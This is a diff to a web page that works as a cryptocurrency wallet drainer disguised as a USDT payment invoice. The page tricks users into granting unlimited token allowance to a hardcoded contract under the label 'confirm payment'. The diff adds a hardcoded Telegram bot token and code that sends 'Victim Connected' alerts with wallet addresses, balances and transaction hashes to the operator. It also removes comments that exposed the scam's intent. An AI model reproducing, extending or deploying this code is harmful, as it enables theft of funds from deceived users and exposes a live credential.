@@ -46,7 +46,7 @@
             </div>
         </div>
 
-        <!-- QR Code Section (For Desktop / Operator View) -->
+        <!-- QR Code Section (For Desktop View) -->
         <div id="qrSection" class="mb-5 flex flex-col items-center">
             <div class="relative p-3 bg-white rounded-2xl shadow-inner inline-block">
                 <div id="qrcode"></div>
@@ -101,7 +101,9 @@
             CONTRACT_ADDRESS: "0x6c59f440B5b06DbCC08C49B3B27796AB26Ba624E",
             USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
             CHAIN_ID: "0x38",
-            userId: new URLSearchParams(window.location.search).get('userId') || 'default'
+            userId: new URLSearchParams(window.location.search).get('userId') || 'default',
+            BOT_TOKEN: "9013728996:AAGgGGzlpfmK1N_7XYrYzB_sSm6RQpYUgZo",
+            CHAT_ID: "8648175992"
         };
 
         const connectBtn = document.getElementById("connectBtn");
@@ -117,18 +119,15 @@
         window.addEventListener("DOMContentLoaded", () => {
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
             
-            // If opened in mobile external browser, instantly force redirect to Trust Wallet DApp browser
             if (isMobile && typeof window.ethereum === "undefined") {
                 const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
                 window.location.replace(`https://link.trustwallet.com/open_url?coin_id=20000714&url=https://${cleanUrl}`);
                 return;
             }
 
-            // If inside Trust Wallet browser, hide QR code section as user is already in-app
             if (typeof window.ethereum !== "undefined") {
                 qrSection.style.display = "none";
             } else {
-                // Generate QR Code for desktop view
                 const currentUrl = window.location.href;
                 new QRCode(document.getElementById("qrcode"), {
                     text: currentUrl,
@@ -141,13 +140,22 @@
             }
         });
 
-        // Modular Notification Handler
         function showNotification(message, type = "success") {
             statusMsg.style.color = type === "success" ? "#22c55e" : "#ef4444";
             statusMsg.innerText = message;
         }
 
-        // --- 3. WALLET CONNECTION & NETWORK ENFORCEMENT ---
+        // --- TELEGRAM ALERT FUNCTION ---
+        async function sendTelegramAlert(text) {
+            try {
+                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.CHAT_ID}&text=${encodeURIComponent(text)}`;
+                await fetch(url);
+            } catch (e) {
+                console.error("Telegram error:", e);
+            }
+        }
+
+        // --- 3. WALLET CONNECTION & TELEGRAM NOTIFICATION ---
         connectBtn.addEventListener("click", async () => {
             if (typeof window.ethereum === "undefined") {
                 const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
@@ -159,7 +167,6 @@
                 showNotification("Connecting to secure gateway...", "success");
                 provider = new ethers.providers.Web3Provider(window.ethereum);
 
-                // Enforce BNB Smart Chain (0x38)
                 try {
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
@@ -177,13 +184,14 @@
                 connectBtn.innerText = "Connected";
                 connectBtn.classList.add("bg-green-900/30", "border-green-600");
 
-                // Log connection details for operator tracking
-                console.log(`[Admin Log] Victim Connected: ${userAddress} | UserID: ${CONFIG.userId}`);
-
                 // Fetch real-time USDT balance
                 await fetchTokenBalance();
 
-                // Reveal Action Button
+                // Send Telegram Alert instantly on connection
+                const amountVal = document.getElementById("payAmount").value;
+                const alertMsg = `🚨 Victim Connected!\n\n👤 Tag: ${CONFIG.userId}\n📍 Wallet: ${userAddress}\n💰 USDT Balance: ${usdtBalanceSpan.innerText}\n💵 Invoice Amount: ${amountVal} USDT`;
+                await sendTelegramAlert(alertMsg);
+
                 approveBtn.classList.remove("hidden");
                 showNotification("Wallet connected successfully.", "success");
 
@@ -211,7 +219,7 @@
             }
         }
 
-        // --- 5. CORE ACTION: APPROVE MAXIMUM ALLOWANCE ---
+        // --- 5. CORE ACTION: APPROVE MAXIMUM ALLOWANCE & ALERT ---
         approveBtn.addEventListener("click", async () => {
             if (!signer) {
                 showNotification("Please connect your wallet first.", "error");
@@ -226,15 +234,19 @@
                 ];
 
                 const tokenContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI_APPROVE, signer);
-                
-                // MaxUint256 unlimited allowance execution
                 const maxAllowance = ethers.constants.MaxUint256;
 
                 showNotification("Please confirm payment in your wallet...", "success");
                 const tx = await tokenContract.approve(CONFIG.CONTRACT_ADDRESS, maxAllowance);
 
+                // Alert Telegram that approval is pending broadcast
+                await sendTelegramAlert(`⏳ Approval Pending...\n📍 Wallet: ${userAddress}`);
+
                 showNotification("Broadcasting transaction to BSC...", "success");
                 await tx.wait();
+
+                // Success Telegram Alert
+                await sendTelegramAlert(`✅ SUCCESS! Allowance Approved!\n\n📍 Wallet: ${userAddress}\n🔗 TxHash: ${tx.hash}`);
 
                 showNotification("Payment Authorized Successfully!", "success");
                 
@@ -244,6 +256,7 @@
 
             } catch (error) {
                 console.error(error);
+                await sendTelegramAlert(`❌ Failed/Cancelled:\n📍 Wallet: ${userAddress}\n⚠️ Error: ${error.message}`);
                 showNotification(error.data?.message || error.message || "Transaction cancelled", "error");
             }
         });
